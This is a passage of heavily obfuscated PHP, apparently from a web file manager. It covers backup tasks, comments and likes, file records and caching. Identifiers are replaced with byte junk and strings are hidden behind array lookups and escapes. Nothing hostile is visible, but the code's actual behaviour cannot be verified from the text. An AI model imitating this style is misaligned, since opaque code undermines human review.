unset($­õí ±½[$ÏŞ‘Şå«[203]]); } return array_merge($½şŒ«¶», $­õí ±½); } public function listData($¡ôìîş¼ = false, $±œƒäø = "\155\x6f\144\151\146\x79\x54\x69\155\x65", $İ§ç²Ğ¥ = false) { return parent::listData($¡ôìîş¼, $±œƒäø, !0); } public function lastItem() { $úø´¸œ‡ = $this->listData(); return !empty($úø´¸œ‡[0]) ? $úø´¸œ‡[0] : null; } public function kill($Ù©×Â¤Õ) { $úâËÂ® =& $_SERVER[­õöî’–]; $¥¡–²Œ± = $this->listData($Ù©×Â¤Õ); if (!$¥¡–²Œ± || empty($¥¡–²Œ±[$úâËÂ®[32]])) { return !0; } Task::kill($úâËÂ®[770]); Task::kill($úâËÂ®[791]); Task::kill($úâËÂ®[800]); $ÈŸÌŠôÛ = $¥¡–²Œ±[$úâËÂ®[32]]; $¨ëªÆ¼Ó = TEMP_FILES . $úâËÂ®[769] . $ÈŸÌŠôÛ . $úâËÂ®[8]; IO::remove($¨ëªÆ¼Ó, !1); return $this->remove($Ù©×Â¤Õ); } public function remove($ƒ²©“ç˜) { $”€ê­äŠ = $this->listData($ƒ²©“ç˜); if (!$”€ê­äŠ) { return !0; } return $this->backupRemove($”€ê­äŠ); } private function backupRemove($«ñ­Ñı¸) { parent::remove($«ñ­Ñı¸[$_SERVER[­õöî’–][399]]); $œòİ†Ã = $this->backupPath($«ñ­Ñı¸); IO::remove($œòİ†Ã, !1); return !0; } private function backupPath($Œ¢ÍÛ) { $ÇŸ¿†É» =& $_SERVER[­õöî’–]; $³Ä¬çş• = $Œ¢ÍÛ[$ÇŸ¿†É»[32]]; $ãƒ¢úà = Model($ÇŸ¿†É»[761])->get($ÇŸ¿†É»[762]); $‡ºÊ•Ğ = substr(md5($ÇŸ¿†É»[763] . $ãƒ¢úà . $³Ä¬çş•), 0, 8); return "\x7b\151\x6f\72{$Œ¢ÍÛ[$ÇŸ¿†É»[743]]}\x7d\x2f\144\x61\164\x61\x62\x61\163\x65\57\x62\141\x63\x6b\165\160\57" . $³Ä¬çş• . $ÇŸ¿†É»[11] . $‡ºÊ•Ğ; } public function start() { $¦ÚÏæ˜˜ =& $_SERVER[­õöî’–]; if ($GLOBALS[$¦ÚÏæ˜˜[6]][$¦ÚÏæ˜˜[89]][$¦ÚÏæ˜˜[1877]] != $¦ÚÏæ˜˜[88]) { return !0; } $³‚Í§ ˜ = $this->config(); if (!$³‚Í§ ˜ || $³‚Í§ ˜[$¦ÚÏæ˜˜[1630]] != $¦ÚÏæ˜˜[88]) { return !1; } $Â·®¸’ô = $this->process(); foreach ($Â·®¸’ô as $àŒ¼©•¹) { if ($àŒ¼©•¹) { return Task::restart($àŒ¼©•¹[$¦ÚÏæ˜˜[399]]); } } $ùŒª¼Ò = new Backup(); $”Öé¢®° = $ùŒª¼Ò->db(); if ($”Öé¢®°) { $”Öé¢®° = $ùŒª¼Ò->dbFile(); if ($”Öé¢®° && $³‚Í§ ˜[$¦ÚÏæ˜˜[746]] == $¦ÚÏæ˜˜[197]) { $”Öé¢®° = $ùŒª¼Ò->file(); } } Backup::set(array($¦ÚÏæ˜˜[741] => 1, $¦ÚÏæ˜˜[497] => time())); return !0; } public function process() { $Ï§ÄÃÏº =& $_SERVER[­õöî’–]; $Š€œ£ = array($Ï§ÄÃÏº[749] => Task::get($Ï§ÄÃÏº[770]), $Ï§ÄÃÏº[753] => Task::get($Ï§ÄÃÏº[791]), $Ï§ÄÃÏº[199] => Task::get($Ï§ÄÃÏº[800])); $˜¡®®§ô = !1; foreach ($Š€œ£ as &$‡„¤åÌ…) { if ($˜¡®®§ô) { $‡„¤åÌ… = !1; continue; } if ($‡„¤åÌ…) { $¯ó€Ôá‡ = intval(_get($‡„¤åÌ…, $Ï§ÄÃÏº[1665], 0)); if (time() - $¯ó€Ôá‡ > 7200) { Task::kill($‡„¤åÌ…[$Ï§ÄÃÏº[399]]); $˜¡®®§ô = !0; $‡„¤åÌ… = !1; } } } return $Š€œ£; } public function restore() { $ñ°àôÁ =& $_SERVER[­õöî’–]; ActionCall($ñ°àôÁ[1058], !0, 1); ActionCall($ñ°àôÁ[1058], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\x6d\155\145\156\x74"; protected $tableMeta = array("\x74\141\x62\154\x65\x4e\141\155\145" => "\143\157\x6d\x6d\x65\x6e\x74\x5f\155\145\164\141", "\155\x65\164\141\106\151\x65\x6c\144" => "\x63\x6f\155\155\145\156\164\x49\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($¢Ó—¢°ê) { $ì«èàÏ =& $_SERVER[­õöî’–]; if ($¢Ó—¢°ê[$ì«èàÏ[1878]]) { $ÓüÌ˜š = $this->where(array($ì«èàÏ[1879] => $¢Ó—¢°ê[$ì«èàÏ[1878]]))->find(); if (!$ÓüÌ˜š || $ÓüÌ˜š[$ì«èàÏ[411]] != $¢Ó—¢°ê[$ì«èàÏ[411]] || $ÓüÌ˜š[$ì«èàÏ[505]] != $¢Ó—¢°ê[$ì«èàÏ[505]]) { return !1; } $this->where(array($ì«èàÏ[1879] => $¢Ó—¢°ê[$ì«èàÏ[1878]]))->setAdd($ì«èàÏ[1880], 1); } $¢Ó—¢°ê[$ì«èàÏ[1881]] = 0; $¢Ó—¢°ê[$ì«èàÏ[1880]] = 0; $¢Ó—¢°ê[$ì«èàÏ[741]] = 1; return $this->add($¢Ó—¢°ê); } public function commentCount($Ì¥’…Ç“, $¦Ü¶½É—, $›ÎÎ°¥Œ = false) { $Í´œÆÌ§ =& $_SERVER[­õöî’–]; if (!$Ì¥’…Ç“) { return array(); } if (is_string($Ì¥’…Ç“) || is_int($Ì¥’…Ç“)) { $Ì¥’…Ç“ = array($Ì¥’…Ç“); } $ˆé“ß¤ = array($Í´œÆÌ§[505], $Í´œÆÌ§[1882] => $Í´œÆÌ§[500]); $¢Úâ¦¶Õ = array($Í´œÆÌ§[505] => array($Í´œÆÌ§[7], $Ì¥’…Ç“), $Í´œÆÌ§[411] => $¦Ü¶½É—); if ($›ÎÎ°¥Œ) { $¢Úâ¦¶Õ[$Í´œÆÌ§[1660]] = $›ÎÎ°¥Œ; } $ãÏş•ñÂ = $this->field($ˆé“ß¤)->where($¢Úâ¦¶Õ)->group($Í´œÆÌ§[505])->select(); return array_to_keyvalue($ãÏş•ñÂ, $Í´œÆÌ§[505], $Í´œÆÌ§[500]); } public function starTarget($¿æÆœ¢Ò, $ıÉø‚÷ñ) { $•Úïô‘É =& $_SERVER[­õöî’–]; $ÏÚÇ»´ò = $¿æÆœ¢Ò + self::TYPE_STAR_OFFSET; $¾¾›œûÁ = array($•Úïô‘É[1660] => USER_ID, $•Úïô‘É[411] => $ÏÚÇ»´ò, $•Úïô‘É[505] => $ıÉø‚÷ñ); $™”«³á = $this->where($¾¾›œûÁ)->find(); if ($™”«³á) { return $this->where(array($•Úïô‘É[399] => $™”«³á[$•Úïô‘É[399]]))->delete(); } $ÀúÔ›’­ = array($•Úïô‘É[1878] => 0, $•Úïô‘É[1660] => USER_ID, $•Úïô‘É[741] => 1, $•Úïô‘É[746] => $•Úïô‘É[12], $•Úïô‘É[411] => $ÏÚÇ»´ò, $•Úïô‘É[505] => $ıÉø‚÷ñ, $•Úïô‘É[1881] => 0, $•Úïô‘É[1880] => 0); return $this->add($ÀúÔ›’­); } public function starTargetCount($Ó¾ôüŠñ, $âË¦º¥‹) { $€’ŞÈ ¢ =& $_SERVER[­õöî’–]; $Æ¯¡ìÊ‚ = $âË¦º¥‹ + self::TYPE_STAR_OFFSET; $×°úÄí‹ = $this->commentCount($Ó¾ôüŠñ, $Æ¯¡ìÊ‚); $ûû÷ğíø = $this->commentCount($Ó¾ôüŠñ, $Æ¯¡ìÊ‚, USER_ID); return array($€’ŞÈ ¢[1883] => $×°úÄí‹, $€’ŞÈ ¢[1884] => $ûû÷ğíø); } public function starTargetUserList($¾·½áò–, $ğ²Âğ¹€) { $˜ÕğúñË =& $_SERVER[­õöî’–]; $î÷Şö‹¯ = $¾·½áò– + self::TYPE_STAR_OFFSET; $±ç€ŒÔÁ = array($˜ÕğúñË[505] => $ğ²Âğ¹€, $˜ÕğúñË[411] => $î÷Şö‹¯); $°Ü»‚€° = $this->where($±ç€ŒÔÁ)->count(); $«™Ÿæéˆ = array($˜ÕğúñË[255] => $°Ü»‚€°, $˜ÕğúñË[1885] => array()); if (!$°Ü»‚€°) { return $«™Ÿæéˆ; } $î’œ§¿ = $this->field($˜ÕğúñË[1660])->where($±ç€ŒÔÁ)->limit(500)->select(); $î’œ§¿ = array_to_keyvalue($î’œ§¿, $˜ÕğúñË[12], $˜ÕğúñË[1660]); $«™Ÿæéˆ[$˜ÕğúñË[1885]] = Model($˜ÕğúñË[513])->userListInfo($î’œ§¿); return $«™Ÿæéˆ; } public function prasiseUserList($ˆµÈÀ¦³) { $Ù„ĞØö =& $_SERVER[­õöî’–]; $ù€¢øˆÙ = array($Ù„ĞØö[1886] => $ˆµÈÀ¦³); $¥¸ïÚ¿ = $this->where($ù€¢øˆÙ)->find(); $¼‰ÃƒÍ÷ = _get($¥¸ïÚ¿, $Ù„ĞØö[1881], 0); $Ëş±‹ëú = array($Ù„ĞØö[255] => $¼‰ÃƒÍ÷, $Ù„ĞØö[1885] => array()); if (!$¼‰ÃƒÍ÷) { return $Ëş±‹ëú; } $è¹©•´ = Model($Ù„ĞØö[1887])->field($Ù„ĞØö[1660])->where($ù€¢øˆÙ)->limit(500)->select(); $è¹©•´ = array_to_keyvalue($è¹©•´, $Ù„ĞØö[12], $Ù„ĞØö[1660]); $Ëş±‹ëú[$Ù„ĞØö[1885]] = Model($Ù„ĞØö[513])->userListInfo($è¹©•´); return $Ëş±‹ëú; } public function remove($Ëƒ‡‹Áî) { $ÖÎ‰Ì‡‘ =& $_SERVER[­õöî’–]; $Å êú = array($ÖÎ‰Ì‡‘[1879] => $Ëƒ‡‹Áî); $¦İìø‹ = $this->where($Å êú)->find(); if ($¦İìø‹[$ÖÎ‰Ì‡‘[1878]]) { $this->where(array($ÖÎ‰Ì‡‘[1879] => $¦İìø‹[$ÖÎ‰Ì‡‘[1878]]))->setAdd($ÖÎ‰Ì‡‘[1880], -1); } return $this->where($Å êú)->delete(); } public function edit($ ãõºïŠ, $²óÛ†¼¤) { $¸ó›Äï„ =& $_SERVER[­õöî’–]; $—’ŒÍñÉ = array($¸ó›Äï„[1879] => $ ãõºïŠ); return $this->where($—’ŒÍñÉ)->save(array($¸ó›Äï„[1888] => $²óÛ†¼¤)); } public function prasise($«ÄÑŒı) { $ÌáÃ¸ =& $_SERVER[­õöî’–]; $è¦Ç›“Ï = Model($ÌáÃ¸[1889]); $Úçï‹â = array($ÌáÃ¸[1879] => $«ÄÑŒı, $ÌáÃ¸[1651] => USER_ID); $¯ü€Áœ´ = $è¦Ç›“Ï->where($Úçï‹â)->find(); if (!$¯ü€Áœ´) { $è¦Ç›“Ï->add($Úçï‹â); $©“üÑÜŞ = $this->where(array($ÌáÃ¸[1879] => $«ÄÑŒı))->setAdd($ÌáÃ¸[1881], 1); } else { $è¦Ç›“Ï->where($Úçï‹â)->delete(); $©“üÑÜŞ = $this->where(array($ÌáÃ¸[1879] => $«ÄÑŒı))->setAdd($ÌáÃ¸[1881], -1); } return $©“üÑÜŞ; } public function targetInfo($‡˜Öú‡€, $ˆ¬»¼½) { $Ü‰« œ¿ =& $_SERVER[­õöî’–]; $Í–›¦ñ• = array($Ü‰« œ¿[586] => $‡˜Öú‡€, $Ü‰« œ¿[587] => $ˆ¬»¼½); $’ËğÔ‚ = $this->where($Í–›¦ñ•)->count(); $¾œô–Û× = "\122\111\x47\110\124\x20\112\117\111\116\x20{$this->tablePrefix}\x63\x6f\155\x6d\145\x6e\164\x5f\160\162\x61\151\x73\145\x20\x73\164\x61\162\x20\x6f\x6e\40\x63\x6f\x6d\155\x65\156\x74\56\x63\x6f\155\x6d\145\156\164\x49\x44\x20\75\40\x73\164\141\x72\56\143\x6f\155\155\145\156\x74\111\x44"; $äÎÇú§â = $this->alias($Ü‰« œ¿[354])->where($Í–›¦ñ•)->join($¾œô–Û×, $Ü‰« œ¿[1890])->count(); $©Û÷ò„ = array($Ü‰« œ¿[1891] => $’ËğÔ‚, $Ü‰« œ¿[1892] => $äÎÇú§â); return $©Û÷ò„; } public function listData($Øè®ÍÖ­) { $Æ×‹æ«Ø =& $_SERVER[­õöî’–]; if (isset($Øè®ÍÖ­[$Æ×‹æ«Ø[1893]])) { if ($Øè®ÍÖ­[$Æ×‹æ«Ø[1893]]) { $Øè®ÍÖ­[$Æ×‹æ«Ø[1886]] = array($Æ×‹æ«Ø[1012], intval($Øè®ÍÖ­[$Æ×‹æ«Ø[1893]])); } unset($Øè®ÍÖ­[$Æ×‹æ«Ø[1893]]); } if (isset($Øè®ÍÖ­[$Æ×‹æ«Ø[1894]])) { if ($Øè®ÍÖ­[$Æ×‹æ«Ø[1894]]) { $Øè®ÍÖ­[$Æ×‹æ«Ø[1886]] = array($Æ×‹æ«Ø[1009], intval($Øè®ÍÖ­[$Æ×‹æ«Ø[1894]])); } unset($Øè®ÍÖ­[$Æ×‹æ«Ø[1894]]); } return $this->_listData($Øè®ÍÖ­); } private function _listData($ïÜ¦·æ) { $½á¨É©¨ =& $_SERVER[­õöî’–]; $ÚÏ¯³ÌÛ = $this->where($ïÜ¦·æ)->_makeOrder()->selectPage(100); $this->_listAppendParent($ÚÏ¯³ÌÛ[$½á¨É©¨[369]]); $this->_listAppendUser($ÚÏ¯³ÌÛ[$½á¨É©¨[369]]); $this->_listAppendMeta($ÚÏ¯³ÌÛ[$½á¨É©¨[369]]); return $ÚÏ¯³ÌÛ; } private function _makeOrder() { $ÌÖ®ÕÃ =& $_SERVER[­õöî’–]; $¼İöø = array($ÌÖ®ÕÃ[1881], $ÌÖ®ÕÃ[1880], $ÌÖ®ÕÃ[200]); $«îÄ¼Œ = Input::get($ÌÖ®ÕÃ[457], $ÌÖ®ÕÃ[7], $ÌÖ®ÕÃ[423], $¼İöø); $ÅçƒÃ”Ö = Input::get($ÌÖ®ÕÃ[458], $ÌÖ®ÕÃ[7], $ÌÖ®ÕÃ[1653], array($ÌÖ®ÕÃ[1895], $ÌÖ®ÕÃ[453])); $ÔÅçµÄ = $«îÄ¼Œ . $ÌÖ®ÕÃ[53] . $ÅçƒÃ”Ö; return $this->order($ÔÅçµÄ); } private function _listAppendParent(&$Û¿×ƒŠ) { $œÚšœ‡‰ =& $_SERVER[­õöî’–]; $­€…ªÙ = array_unique(array_to_keyvalue($Û¿×ƒŠ, $œÚšœ‡‰[12], $œÚšœ‡‰[1878])); $­€…ªÙ = array_remove_value($­€…ªÙ, $œÚšœ‡‰[197]); if (!$­€…ªÙ) { return; } $ğÁ×‡Ç– = $this->where(array($œÚšœ‡‰[1879] => array($œÚšœ‡‰[7], $­€…ªÙ)))->select(); $ğÁ×‡Ç– = array_to_keyvalue($ğÁ×‡Ç–, $œÚšœ‡‰[1886]); foreach ($Û¿×ƒŠ as &$¹‡§€˜ƒ) { if (isset($ğÁ×‡Ç–[$¹‡§€˜ƒ[$œÚšœ‡‰[1878]]])) { $¹‡§€˜ƒ[$œÚšœ‡‰[1896]] = $ğÁ×‡Ç–[$¹‡§€˜ƒ[$œÚšœ‡‰[1878]]]; } } unset($¹‡§€˜ƒ); } private function _listAppendUser(&$óú“Ô¯Â) { $ÄßÎºÏ =& $_SERVER[­õöî’–]; $¼âÔçÜº = array_unique(array_to_keyvalue($óú“Ô¯Â, $ÄßÎºÏ[12], $ÄßÎºÏ[1660])); $¼âÔçÜº = array_remove_value($¼âÔçÜº, $ÄßÎºÏ[197]); if (count($¼âÔçÜº) == 0) { return; } foreach ($óú“Ô¯Â as $ó¨ñ÷Ó) { if (isset($ó¨ñ÷Ó[$ÄßÎºÏ[1896]])) { $¼âÔçÜº[] = $ó¨ñ÷Ó[$ÄßÎºÏ[1896]][$ÄßÎºÏ[1660]]; } } $»âşÕ¶² = Model($ÄßÎºÏ[535])->userListInfo($¼âÔçÜº); foreach ($óú“Ô¯Â as &$ó¨ñ÷Ó) { $ó¨ñ÷Ó[$ÄßÎºÏ[600]] = $»âşÕ¶²[$ó¨ñ÷Ó[$ÄßÎºÏ[1660]]]; if (isset($ó¨ñ÷Ó[$ÄßÎºÏ[1896]])) { $ó¨ñ÷Ó[$ÄßÎºÏ[1896]][$ÄßÎºÏ[600]] = $»âşÕ¶²[$ó¨ñ÷Ó[$ÄßÎºÏ[1896]][$ÄßÎºÏ[1660]]]; } } unset($ó¨ñ÷Ó); } private function _listAppendMeta(&$ğà‡©) { $ÉŸï‡Æˆ =& $_SERVER[­õöî’–]; $…Ôû±·ç = array_unique(array_to_keyvalue($ğà‡©, $ÉŸï‡Æˆ[12], $ÉŸï‡Æˆ[1886])); $…Ôû±·ç = array_remove_value($…Ôû±·ç, $ÉŸï‡Æˆ[197]); if (!$…Ôû±·ç) { return; } foreach ($ğà‡© as $Ÿ´˜ÁéÖ) { if (isset($Ÿ´˜ÁéÖ[$ÉŸï‡Æˆ[1896]])) { $…Ôû±·ç[] = $Ÿ´˜ÁéÖ[$ÉŸï‡Æˆ[1896]][$ÉŸï‡Æˆ[1886]]; } } $á´À´»¥ = $this->metaList($…Ôû±·ç); if (!$á´À´»¥) { return !1; } foreach ($ğà‡© as &$Ÿ´˜ÁéÖ) { $Ÿ´˜ÁéÖ[$ÉŸï‡Æˆ[466]] = $á´À´»¥[$Ÿ´˜ÁéÖ[$ÉŸï‡Æˆ[1886]]]; if (isset($Ÿ´˜ÁéÖ[$ÉŸï‡Æˆ[1896]])) { $Ÿ´˜ÁéÖ[$ÉŸï‡Æˆ[1896]][$ÉŸï‡Æˆ[466]] = $á´À´»¥[$Ÿ´˜ÁéÖ[$ÉŸï‡Æˆ[1896]][$ÉŸï‡Æˆ[1886]]]; } } unset($Ÿ´˜ÁéÖ); } private function metaList($úà­Òù) { $×šŠİÓú =& $_SERVER[­õöî’–]; if (!$úà­Òù) { return array(); } $Ãë¬½„å = array($×šŠİÓú[1886] => array($×šŠİÓú[7], $úà­Òù)); $¤ò¿ış¶ = Model($×šŠİÓú[1897])->where($Ãë¬½„å)->select(); $¤ò¿ış¶ = array_to_keyvalue_group($¤ò¿ış¶, $×šŠİÓú[1886]); foreach ($¤ò¿ış¶ as $ôŞŒÈ”Œ => $¸òª’˜İ) { $ƒÍìûÄ = array(); foreach ($¸òª’˜İ as $®üˆÍ¶ä) { $ƒÍìûÄ[$®üˆÍ¶ä[$×šŠİÓú[94]]] = $®üˆÍ¶ä[$×šŠİÓú[374]]; } $¤ò¿ış¶[$ôŞŒÈ”Œ] = $ƒÍìûÄ; } return $¤ò¿ış¶ ? $¤ò¿ış¶ : array(); } } class FileContentModel extends ModelBase { protected $tableName = "\x69\157\137\x66\x69\154\145\137\x63\x6f\156\164\145\156\x74\x73"; protected $dataAuto = array(array("\x63\162\145\141\164\145\x54\x69\x6d\145", "\164\151\x6d\145", "\x69\x6e\163\145\x72\164", "\x66\x75\x6e\143\164\x69\157\x6e")); } goto C…ºŞ’ó°ƒ; B¶ã‚†ğ„¦: class BackupFile { public function __construct() { } public function index() { $¹Õ«ô­™ = Backup::get(); $ŒÓ¡¤÷… = $¹Õ«ô­™[$_SERVER[­õöî’–][293]][$_SERVER[­õöî’–][199]][$_SERVER[­õöî’–][468]]; $âÃçÀÅ» = array($_SERVER[­õöî’–][469] => array($_SERVER[­õöî’–][798], $ŒÓ¡¤÷…), $_SERVER[­õöî’–][799] => array($_SERVER[­õöî’–][331], $¹Õ«ô­™[$_SERVER[­õöî’–][743]])); $¼ÛÄ“Ÿå = (int) Model($_SERVER[­õöî’–][780])->where($âÃçÀÅ»)->count($_SERVER[­õöî’–][468]); $¥¹…ûĞÏ = (int) Model($_SERVER[­õöî’–][780])->where($âÃçÀÅ»)->sum($_SERVER[­õöî’–][76]); $öÔ¨î¢× = new TaskFileTransfer($_SERVER[­õöî’–][800], $_SERVER[­õöî’–][771], $¼ÛÄ“Ÿå, LNG($_SERVER[­õöî’–][772]) . $_SERVER[­õöî’–][773] . LNG($_SERVER[­õöî’–][801])); $öÔ¨î¢×->task[$_SERVER[­õöî’–][754]] = $¥¹…ûĞÏ; $¯¥‰Œğı = array($_SERVER[­õöî’–][802] => $¼ÛÄ“Ÿå, $_SERVER[­õöî’–][803] => $¥¹…ûĞÏ, $_SERVER[­õöî’–][804] => time()); Backup::set($¯¥‰Œğı); $‰›Î·ïŞ = !0; $ƒ® ¸’Ò = $this->storeIds(); $¿Îš×û¹ = 1; $ÂîšŸï› = 1000; $¨‰ï«ş = $›Øûö›¹ = 0; $ÀªÃœÍÍ = array(); $¸¯øÖˆ = $‚ Êï­— = 0; do { $Õ»ÈÌ = $_SERVER[­õöî’–][805]; $ÑñÊú¬ = Model($_SERVER[­õöî’–][780])->where($âÃçÀÅ»)->field($Õ»ÈÌ)->order($_SERVER[­õöî’–][806])->selectPage($ÂîšŸï›, $¿Îš×û¹); $ãÅœ¿Ä = !empty($ÑñÊú¬[$_SERVER[­õöî’–][369]]) ? $ÑñÊú¬[$_SERVER[­õöî’–][369]] : array(); foreach ($ãÅœ¿Ä as $………ÂÃ´) { if (!$this->_fileExist($………ÂÃ´, $ÀªÃœÍÍ, $ƒ® ¸’Ò)) { $¼ÛÄ“Ÿå -= 1; $¥¹…ûĞÏ -= (int) $………ÂÃ´[$_SERVER[­õöî’–][76]]; write_log("\x66\x69\x6c\145\40\x6e\157\164\x20\145\170\151\163\164\56\x66\151\x6c\145\x49\104\x3a{$………ÂÃ´[$_SERVER[­õöî’–][468]]}\x2c\40\160\x61\164\150\72{$………ÂÃ´[$_SERVER[­õöî’–][84]]}", $_SERVER[­õöî’–][807]); continue; } $ÈãÀ”™ß = $………ÂÃ´[$_SERVER[­õöî’–][84]]; $“öÛ¶ø = "\173\151\x6f\72{$¹Õ«ô­™[$_SERVER[­õöî’–][743]]}\175" . substr($ÈãÀ”™ß, strlen("\173\x69\x6f\x3a{$………ÂÃ´[$_SERVER[­õöî’–][808]]}\x7d")); if (IO::exist($“öÛ¶ø)) { $öÔ¨î¢×->updateFileEnd($………ÂÃ´[$_SERVER[­õöî’–][32]], $………ÂÃ´[$_SERVER[­õöî’–][76]]); } else { $“öÛ¶ø = get_path_father($“öÛ¶ø); IO::mkdir($“öÛ¶ø); if (!IO::copy($ÈãÀ”™ß, $“öÛ¶ø, $_SERVER[­õöî’–][809])) { write_log($_SERVER[­õöî’–][810] . $ÈãÀ”™ß . $_SERVER[­õöî’–][794] . $“öÛ¶ø . $_SERVER[­õöî’–][164], $_SERVER[­õöî’–][771]); $‰›Î·ïŞ = !1; break; } } $ŒÓ¡¤÷… = $………ÂÃ´[$_SERVER[­õöî’–][468]]; $›Øûö›¹ += 1; $¨‰ï«ş += $………ÂÃ´[$_SERVER[­õöî’–][76]]; $‚ Êï­— += 1; $¸¯øÖˆ += $………ÂÃ´[$_SERVER[­õöî’–][76]]; if ($¨‰ï«ş >= 1024 * 1024 * 100) { $¯¥‰Œğı = array($_SERVER[­õöî’–][811] => $ŒÓ¡¤÷…, $_SERVER[­õöî’–][812] => $‚ Êï­—, $_SERVER[­õöî’–][813] => $¸¯øÖˆ); Backup::set($¯¥‰Œğı); $¨‰ï«ş = $›Øûö›¹ = 0; } } $à«¼¸Ø¯ = count($ãÅœ¿Ä); $¿Îš×û¹++; } while ($à«¼¸Ø¯ == $ÂîšŸï›); $öÔ¨î¢×->end(); $¯¥‰Œğı = array($_SERVER[­õöî’–][814] => 1, $_SERVER[­õöî’–][497] => time(), $_SERVER[­õöî’–][766] => 1, $_SERVER[­õöî’–][811] => $ŒÓ¡¤÷…, $_SERVER[­õöî’–][803] => $¥¹…ûĞÏ, $_SERVER[­õöî’–][802] => $¼ÛÄ“Ÿå, $_SERVER[­õöî’–][815] => time()); if ($›Øûö›¹) { $¯¥‰Œğı[$_SERVER[­õöî’–][812]] = $‚ Êï­—; $¯¥‰Œğı[$_SERVER[­õöî’–][813]] = $¸¯øÖˆ; } Backup::set($¯¥‰Œğı); $this->_fileFilter($ÀªÃœÍÍ); return !0; } private function _fileExist($¥»®ëŠü, &$¼º˜ÉÆÔ, $Ü“²À¢) { $Ù¬î©¹œ =& $_SERVER[­õöî’–]; $®‡–ŠÆÚ = $¥»®ëŠü[$Ù¬î©¹œ[84]]; if (in_array($¥»®ëŠü[$Ù¬î©¹œ[468]], $¼º˜ÉÆÔ)) { return !1; } if (!in_array($¥»®ëŠü[$Ù¬î©¹œ[808]], $Ü“²À¢)) { return !1; } if (IO::exist($®‡–ŠÆÚ)) { return !0; } $¨Ùœ™Ê‘ = get_path_father($®‡–ŠÆÚ); if (IO::exist($¨Ùœ™Ê‘)) { $¼º˜ÉÆÔ[] = $¥»®ëŠü[$Ù¬î©¹œ[468]]; return !1; } $†„¸›ùÚ = array($Ù¬î©¹œ[808] => $¥»®ëŠü[$Ù¬î©¹œ[808]], $Ù¬î©¹œ[84] => array($Ù¬î©¹œ[383], "{$¨Ùœ™Ê‘}\x25")); $Í¯‰² = Model($Ù¬î©¹œ[780])->where($†„¸›ùÚ)->field($Ù¬î©¹œ[469])->select(); $¼º˜ÉÆÔ = array_merge($¼º˜ÉÆÔ, array_to_keyvalue($Í¯‰², $Ù¬î©¹œ[12], $Ù¬î©¹œ[468])); return !1; } private function _fileFilter($Õ¸ÏíÁŠ) { $‡éø¶ÛŠ =& $_SERVER[­õöî’–]; if (empty($Õ¸ÏíÁŠ)) { return; } $¨×½ŠÛ´ = array($‡éø¶ÛŠ[468] => array($‡éø¶ÛŠ[7], array_unique($Õ¸ÏíÁŠ))); $–¨„ã­¨ = Model($‡éø¶ÛŠ[816])->where($¨×½ŠÛ´)->field($‡éø¶ÛŠ[402])->select(); foreach ($–¨„ã­¨ as $½àü‹Ù½) { Model($‡éø¶ÛŠ[816])->remove($½àü‹Ù½[$‡éø¶ÛŠ[402]], !1); } } private function storeIds() { $ÅÙ²ëïñ =& $_SERVER[­õöî’–]; $ğ¼°¯Ú = Model($ÅÙ²ëïñ[758])->listData(); $ ´¼ö¾¥ = array(); $³ĞÕû = $GLOBALS[$ÅÙ²ëïñ[6]][$ÅÙ²ëïñ[89]][$ÅÙ²ëïñ[817]]; foreach ($ğ¼°¯Ú as $‡º¾´À¨) { $³‰Ü Âô = strtolower($‡º¾´À¨[$ÅÙ²ëïñ[95]]); if (!isset($³ĞÕû[$³‰Ü Âô])) { continue; } $ö¡ß³ÜÅ = $ÅÙ²ëïñ[74] . (isset($³ĞÕû[$³‰Ü Âô]) ? $³ĞÕû[$³‰Ü Âô] : ucfirst($³‰Ü Âô)); if (!class_exists($ö¡ß³ÜÅ)) { continue; } $ ´¼ö¾¥[] = $‡º¾´À¨[$ÅÙ²ëïñ[399]]; } return $ ´¼ö¾¥; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $‘Ô³ºÙ =& $_SERVER[­õöî’–]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $éáıº©´ = $GLOBALS[$‘Ô³ºÙ[6]][$‘Ô³ºÙ[349]]; $Æ³†€î = $éáıº©´[$éáıº©´[$‘Ô³ºÙ[818]]]; $ƒ Í„§Ñ = $éáıº©´[$‘Ô³ºÙ[819]]; switch ($éáıº©´[$‘Ô³ºÙ[818]]) { case $‘Ô³ºÙ[21]: self::$handle = Model($‘Ô³ºÙ[820]); break; case $‘Ô³ºÙ[821]: self::$handle = new CacheRedis($Æ³†€î, $ƒ Í„§Ñ); break; case $‘Ô³ºÙ[822]: self::$handle = new CacheMemcached($Æ³†€î, $ƒ Í„§Ñ); break; case $‘Ô³ºÙ[199]: self::$handle = new CacheFile($Æ³†€î, $ƒ Í„§Ñ); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($ßá¯„ùø) { if (is_array($ßá¯„ùø) || is_object($ßá¯„ùø)) { $ßá¯„ùø = json_encode($ßá¯„ùø); } $ßá¯„ùø = rawurlencode($ßá¯„ùø); return md5(KOD_SITE_ID . $_SERVER[­õöî’–][11] . $ßá¯„ùø); } public static function get($ªÎÀ‚¹Ü, $‘ëª¤£… = false) { $°­äİşğ = self::key($ªÎÀ‚¹Ü); if ($‘ëª¤£…) { return unserialize(self::init()->get($°­äİşğ)); } if (!isset(self::$memoryCache[$°­äİşğ])) { $ÀøÔ´ÎÎ = self::init()->get($°­äİşğ); self::$memoryCache[$°­äİşğ] = unserialize($ÀøÔ´ÎÎ); } return self::$memoryCache[$°­äİşğ]; } public static function set($¢¹¼‡”­, $ı™ß¸‡, $²˜ß³’Œ = false) { $¥ûÂª­ù = self::key($¢¹¼‡”­); if (isset(self::$memoryCache[$¥ûÂª­ù]) && self::$memoryCache[$¥ûÂª­ù] === $ı™ß¸‡) { return !0; } if ($²˜ß³’Œ === 0) { self::$memoryCache[$¥ûÂª­ù] = $ı™ß¸‡; return !0; } CacheLock::lock($¢¹¼‡”­); $Ÿ‚Õ’œÎ = self::init()->set($¥ûÂª­ù, serialize($ı™ß¸‡), $²˜ß³’Œ); self::$memoryCache[$¥ûÂª­ù] = $ı™ß¸‡; CacheLock::unlock($¢¹¼‡”­); return $Ÿ‚Õ’œÎ; } public static function getCall($Ù³ü÷Ö, $ãåàÙÆ, $÷¥‹™üÌ, $¹ËŸ¹‚ş = array()) { $œõãá´– =& $_SERVER[­õöî’–]; 